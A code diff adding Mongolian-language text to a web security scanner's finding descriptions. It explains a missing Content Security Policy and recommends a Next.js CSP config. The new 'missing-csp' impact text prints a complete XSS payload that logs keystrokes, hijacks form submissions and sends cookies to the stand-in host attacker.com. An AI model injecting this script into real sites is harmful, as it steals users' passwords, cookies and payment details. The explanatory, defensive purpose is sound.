@@ -192,10 +192,59 @@ const FINDING_TRANSLATIONS_MN: Record<
     recommendation: "HTTPS бүх газарт ажилж байгааг шалгасны дараа урт max-age-тай Strict-Transport-Security нэм.",
   },
   "missing-csp": {
-    title: "Content Security Policy (CSP) байхгүй",
+    title: "Content Security Policy (CSP) байхгүй — XSS халдлага бүрэн нээлттэй",
     evidence: "Content-Security-Policy header олдсонгүй.",
-    impact: "Яаг юу болох вэ: Хэрэв сайтад хайлт, коммент, эсвэл аль нэг форм дээр оролт шалгалтгүй хэсэг байвал халдагч тэнд <script> код оруулна. Тэр скрипт таны хуудас уншдаг хэрэглэгч БҮРИЙН хөтөч дээр ажиллаж, тэдний бичиж буй нэр, хаяг, нууц үг, QPay мэдээлэл бодит цаг дотор халдагчийн серверт явна. Хэрэглэгч ямар ч анхааруулга харахгүй. CSP байсан бол хөтөч тэр гадны скриптийг автоматаар блоклох байсан.",
-    recommendation: "Зөвхөн хэрэглэдэг скрипт, стиль, фрэйм, холболтыг зөвшөөрдөг хязгаарлагдмал CSP нэм.",
+    impact: `Яаг юу болох вэ — яг энэ script-ийг ашиглана:
+
+АЛХАМ 1 — Халдагч таны хайлт эсвэл коммент хэсэгт дараах бичвэрийг хуулан буулгана (энэ нь бодит ашиглагддаг script):
+<script>
+(function(){
+  // Keylogger: товч бүр дарахад явуулна
+  document.addEventListener('keyup',function(e){
+    new Image().src='https://attacker.com/k?key='+encodeURIComponent(e.key)+'&url='+encodeURIComponent(location.href);
+  });
+  // Form hijack: submit дарахад бүх талбарыг явуулна
+  document.querySelectorAll('form').forEach(function(f){
+    f.addEventListener('submit',function(){
+      fetch('https://attacker.com/form',{method:'POST',body:new FormData(f)});
+    },true);
+  });
+  // Cookie theft: нэн даруй cookie явуулна
+  new Image().src='https://attacker.com/c?v='+encodeURIComponent(document.cookie);
+})();
+</script>
+
+АЛХАМ 2 — Хэрэв хайлт/коммент хадгалагддаг бол (stored XSS): тэр хуудасыг нээдэг хэрэглэгч БҮР дээрх скриптийг ажиллуулна. 1 удаагийн халдлага → хэдэн мянган хэрэглэгчийн мэдээлэл.
+
+АЛХАМ 3 — attacker.com-д хүсэлт ирнэ: ?key=С, ?key=э, ?key=р... гэж нэр, нууц үг, хаяг, QPay мэдээлэл товч бүр дарах бүрд очно. Form submit дарахад бүх талбар нэг дор POST-оор очно.
+
+АЛХАМ 4 — Хэрэглэгч ямар ч анхааруулга харахгүй, таны сайт хэвийн харагдана, гэхдээ бүх мэдээлэл халдагчид очсон байна.
+
+CSP байсан бол: connect-src 'self' гэж тохируулсан тул хөтөч attacker.com руу хүсэлт явуулахыг автоматаар блоклох байсан. Script ажиллах ч үгүй.`,
+    recommendation: `Next.js дээр яг хэрхэн нэмэх вэ (next.config.ts):
+
+async headers() {
+  return [{
+    source: '/(.*)',
+    headers: [{
+      key: 'Content-Security-Policy',
+      value: [
+        "default-src 'self'",
+        "script-src 'self' 'unsafe-inline'",
+        "style-src 'self' 'unsafe-inline'",
+        "img-src 'self' data: https:",
+        "connect-src 'self' https://api.qpay.mn",
+        "frame-ancestors 'none'",
+        "form-action 'self'",
+        "base-uri 'self'"
+      ].join('; ')
+    }]
+  }]
+}
+
+Директив бүрийн утга: default-src 'self' = зөвхөн таны домэйнаас л ачаалж болно. connect-src 'self' https://api.qpay.mn = зөвхөн таны сервер болон QPay руу л хүсэлт явуулж болно — attacker.com БЛОКЛОГДОНО. frame-ancestors 'none' = таны сайтыг iframe-аар оруулахыг хориглоно. form-action 'self' = form-ийн submit зөвхөн таны домэйн руу явна.
+
+Нэмж заавал хий: хайлт, коммент, URL параметрийн бүх оролтоос < > ' " & тэмдэгтийг HTML entity болгон encode хий — input sanitization. Шалгах: Chrome → F12 → Console дотор "Content Security Policy" гэсэн violation мэдэгдэл харагдвал тэр эх сурвалжийг connect-src эсвэл script-src-д нэм.`,
   },
   "weak-csp": {
     title: "CSP аюултай эх сурвалж зөвшөөрч байна",
